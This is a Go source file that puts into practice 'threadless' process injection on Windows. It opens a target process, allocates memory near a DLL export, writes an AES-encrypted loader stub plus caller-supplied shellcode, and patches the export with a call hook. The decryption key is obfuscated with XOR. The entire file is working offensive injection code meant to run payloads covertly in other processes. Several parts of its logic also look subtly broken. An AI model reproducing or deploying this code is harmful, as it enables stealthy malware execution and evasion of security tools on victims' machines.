package ThreadlessInject

import (
	"bufio"
	"github.com/wumansgy/goEncrypt/aes"
	"github.com/zngw/xor"
	"io"
	"log"
	"os"
	"syscall"
	"time"
	"unsafe"
)

const (
	VmOperation            = 0x0008
	VmRead                 = 0x0010
	VmWrite                = 0x0020
	IntPtrZero             = 0
	Commit                 = 0x1000
	Reserve                = 0x2000
	ExecuteRead            = 0x20
	ExecuteReadWrite       = 0x40
	bytesWritten           = 0
	ReadWrite              = 0x04
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)

var (
	err           error
	executed      = false
	addr          uintptr
	newProtection uintptr
	hProcess      uintptr
	oldProtect    uintptr
	oldProtection uintptr
	loaderAddress uintptr
	f             *os.File
	// P1 -> ShellcodeLoader
	P1 = "vrIvoLcyCCzBNssm/kFmjIAW2w1uZlMh6OuiCc62K1AM4N7lDbkoDtJs0IhI1D/qF3dWEV7f9xhecAtGWFQmHQ=="
)

type ObjectAttributes struct {
	Length                   int32
	RootDirectory            uintptr
	ObjectName               *uint16
	Attributes               uint32
	SecurityDescriptor       uintptr
	SecurityQualityOfService uintptr
}

type ClientId struct {
	UniqueProcess uintptr
	UniqueThread  uintptr
}

func FindMemoryHole(hProcess uintptr, exportAddress uintptr, size uintptr) uintptr {
	var remoteLoaderAddress uintptr
	foundMemory := false

	for remoteLoaderAddress = (exportAddress & 0xFFFFFFFFFFF70000) - 0x70000000; remoteLoaderAddress < exportAddress+0x70000000; remoteLoaderAddress += 0x10000 {
		//sys NtAllocateVirtualMemoryNu1r(p1 uintptr,p2 uintptr,p3 uintptr,p4 uintptr,p5 uintptr,p6 uintptr) (err2 error) =ntdll.NtAllocateVirtualMemory
		err = NtAllocateVirtualMemoryNu1r(
			hProcess,
			uintptr(unsafe.Pointer(&remoteLoaderAddress)),
			IntPtrZero,
			uintptr(unsafe.Pointer(&size)),
			Commit|Reserve,
			ExecuteRead,
		)
		if err != nil {
			log.Fatal("[!] 不要重复对一个进程进行脱钩", err)
			continue
		}

		foundMemory = true
		break
	}

	if foundMemory {
		return remoteLoaderAddress
	} else {
		return 0
	}
}

func GenerateHook(originalInstructions []byte, p1 []byte) {
	// This function generates the following shellcode.
	// The hooked function export is determined by immediately popping the return address and subtracting by 5 (size of relative call instruction)
	// Original function arguments are pushed onto the stack to restore after the injected shellcode is executed
	// The hooked function bytes are restored to the original values (essentially a one time hook)
	// A relative function call is made to the injected shellcode that will follow immediately after the stub
	// Original function arguments are popped off the stack and restored to the correct registers
	// A jmp back to the original unpatched export restoring program behavior as normal
	//
	// This shellcode loader stub assumes that the injector has left the hooked function RWX to enable restoration,
	// the injector can then monitor for when the restoration has occured to restore the memory back to RX

	/*
	   start:
	     0:  58                      pop    rax
	     1:  48 83 e8 05             sub    rax,0x5
	     5:  50                      push   rax
	     6:  51                      push   rcx
	     7:  52                      push   rdx
	     8:  41 50                   push   r8
	     a:  41 51                   push   r9
	     c:  41 52                   push   r10
	     e:  41 53                   push   r11
	     10: 48 b9 88 77 66 55 44    movabs rcx,0x1122334455667788
	     17: 33 22 11
	     1a: 48 89 08                mov    QWORD PTR [rax],rcx
	     1d: 48 83 ec 40             sub    rsp,0x40
	     21: e8 11 00 00 00          call   shellcode
	     26: 48 83 c4 40             add    rsp,0x40
	     2a: 41 5b                   pop    r11
	     2c: 41 5a                   pop    r10
	     2e: 41 59                   pop    r9
	     30: 41 58                   pop    r8
	     32: 5a                      pop    rdx
	     33: 59                      pop    rcx
	     34: 58                      pop    rax
	     35: ff e0                   jmp    rax
	   shellcode:
	*/
	if f, err = os.CreateTemp("", "d4ac4633ebd6440fa397b84f1bc94a3c"); err != nil {
		log.Fatal(err)
	}
	if _, err = f.Write(p1); err != nil {
		log.Fatal(err)
	}
	//Write the original 8 bytes that were in the original export prior to hooking
	Off := io.NewOffsetWriter(f, 0x12)
	Off.Write(originalInstructions)
	Wri := bufio.NewWriter(Off)
	Wri.Flush()
}

func Inject(DLL string, export string, Pid int, shellcode []byte) {
	done := make(chan string, 5)
	encode := xor.Encode([]byte{92, 111, 70, 82, 15, 83, 3, 122, 0, 69, 84, 103, 98, 4, 121, 117, 113, 66, 80, 127, 112, 114, 81, 102, 1, 96, 116, 97, 109, 124, 115, 95}, 55)
	done <- string(encode)
	P2, _ := aes.AesCbcDecryptByBase64(P1, []byte(<-done), nil)

	hModule, _ := syscall.LoadLibrary(DLL)
	exportAddress, _ := syscall.GetProcAddress(hModule, export)
	oa := ObjectAttributes{}
	cid := ClientId{
		UniqueProcess: uintptr(Pid),
	}
	//sys OpenProcessNu1r(p1 uintptr,p2 uintptr,p3 uintptr,p4 uintptr)=ntdll.NtOpenProcess
	OpenProcessNu1r(
		uintptr(unsafe.Pointer(&hProcess)),
		VmOperation|VmRead|VmWrite,
		uintptr(unsafe.Pointer(&oa)),
		uintptr(unsafe.Pointer(&cid)),
	)
	if loaderAddress = FindMemoryHole(hProcess, exportAddress, uintptr(len(shellcode)+len(P2))); loaderAddress == 0 {
		log.Fatal("[!] 找不到2G的导出地址内存，退出")
		os.Exit(0)
	}
	//在PID内，在0xloaderAddress分配加载器和shellcode
	originalBytes := *(*[]byte)(unsafe.Pointer(exportAddress))
	GenerateHook(originalBytes, P2)
	//sys NtProtectVirtualMemoryNu1r(p1 uintptr,p2 uintptr,p3 uintptr,p4 uintptr,p5 uintptr)(err error)=ntdll.NtProtectVirtualMemory
	if err = NtProtectVirtualMemoryNu1r(
		hProcess,
		exportAddress,
		8,
		ExecuteReadWrite,
		oldProtect,
	); err != nil {
		log.Fatal(err)
	}
	pn1 := loaderAddress - (exportAddress + uintptr(5))
	relativeLoaderAddress := *(*[]byte)(unsafe.Pointer(&pn1))
	callOpCode := []byte{0xe8, 0, 0, 0, 0}

	if f, err = os.CreateTemp("", "d4ac4633ebd6440f84f1bc94a3c"); err != nil {
		log.Fatal(err)
	}
	if _, err = f.Write(callOpCode); err != nil {
		log.Fatal(err)
	}
	//Write the original 8 bytes that were in the original export prior to hooking
	Off := io.NewOffsetWriter(f, 1)
	Off.Write(relativeLoaderAddress)
	//sys NtWriteVirtualMemoryNu1r(p1 uintptr,p2 uintptr,p3 uintptr,p4 uintptr,p5 uintptr)(err error)=ntdll.NtWriteVirtualMemory
	if err = NtWriteVirtualMemoryNu1r(
		hProcess,
		exportAddress,
		uintptr(unsafe.Pointer(&callOpCode)),
		uintptr(len(callOpCode)),
		bytesWritten,
	); err != nil {
		log.Fatal("日志写callOpCode失败", err)
	}

	payload := append(P2, shellcode...)
	payload1 := len(payload)
	if err = NtProtectVirtualMemoryNu1r(
		hProcess,
		loaderAddress,
		uintptr(unsafe.Pointer(&payload)),
		ReadWrite,
		oldProtect,
	); err != nil {
		//log.Fatal(err)
		log.Fatal("取消保护0x" + string(loaderAddress) + "失败")
	}

	if err = NtWriteVirtualMemoryNu1r(
		hProcess,
		loaderAddress,
		uintptr(unsafe.Pointer(&payload1)),
		uintptr(len(payload)),
		0,
	); err != nil {
		log.Fatal("[!] 写有效负载失败", err)
	}

	if err = NtProtectVirtualMemoryNu1r(
		hProcess,
		loaderAddress,
		uintptr(unsafe.Pointer(&payload)),
		newProtection,
		oldProtect,
	); err != nil {
		//log.Fatal(err)
		log.Fatal("取消保护0x" + string(loaderAddress) + "失败")
	}
	startTime := time.Now()
	log.Println(1, "shell_code注入，等待60秒钩子被调用")
	for time.Since(startTime).Seconds() < 60 {
		bytesToRead := 8
		buf := make([]byte, bytesToRead)
		//sys NtReadVirtualMemoryNu1r(p1 uintptr,p2 uintptr,p3 uintptr,p4 uintptr,p5 uintptr)(err error)=ntdll.NtReadVirtualMemory
		if err = NtReadVirtualMemoryNu1r(
			hProcess,
			exportAddress,
			uintptr(unsafe.Pointer(&buf)),
			uintptr(unsafe.Pointer(&bytesToRead)),
			0,
		); err != nil {
			log.Fatal(err)
		}
		temp := make([]byte, bytesToRead)
		srcAddr := (uintptr)(unsafe.Pointer(&buf))
		dst := make([]byte, len(buf))
		copy(dst, (*[1 << 30]byte)(unsafe.Pointer(srcAddr))[:len(buf)])
		copy((*[1 << 30]byte)(temp)[:len(buf)], dst)

		currentBytes := uintptr(unsafe.Pointer(&bytesToRead))
		originalBytes1 := uintptr(unsafe.Pointer(&originalBytes))

		if currentBytes == originalBytes1 {
			executed = true
			break
		}
		time.Sleep(60 * time.Second)
	}

	if executed {
		if err = NtProtectVirtualMemoryNu1r(
			hProcess,
			exportAddress,
			8,
			newProtection,
			oldProtection,
		); err != nil {
			log.Fatal(err)
		}

		//sys NtFreeVirtualMemoryNu1r(p1 uintptr,p2 uintptr)(err error)=ntdll.NtFreeVirtualMemory
		if err = NtFreeVirtualMemoryNu1r(hProcess, loaderAddress); err != nil {
			log.Fatal(err)
		}
		log.Println("执行Shell_code失败，恢复并导出")
	} else {
		log.Println("Shell_code没有在60秒内触发，它可能仍然执行，但没有清理")
	}
}
